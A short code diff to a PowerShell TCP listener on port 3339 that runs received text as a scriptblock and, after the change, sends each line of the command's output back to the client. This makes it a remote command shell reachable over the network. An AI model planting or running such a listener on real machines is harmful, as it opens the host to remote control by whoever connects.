@@ -35,7 +35,12 @@ function Listen-Tcp()
         {
             Write-Host "Received valid command: $ReceivedText" -ForegroundColor Green
             $scriptBlock = [scriptblock]::Create($receivedText)
-            Invoke-Command -ScriptBlock $scriptBlock
+            
+            foreach ($Line in (Invoke-Command -ScriptBlock $scriptBlock))
+            {
+                $returnbuffer = [System.Text.Encoding]::ASCII.GetBytes($Line)
+                $clientSocket.Send($returnbuffer) | Out-Null
+            }
         }
         else
         { 
@@ -45,6 +50,8 @@ function Listen-Tcp()
         $clientSocket.Close()
         $server.Stop()
     }
+    $clientSocket.Close()
+    
 }
 
 $Port = 3339
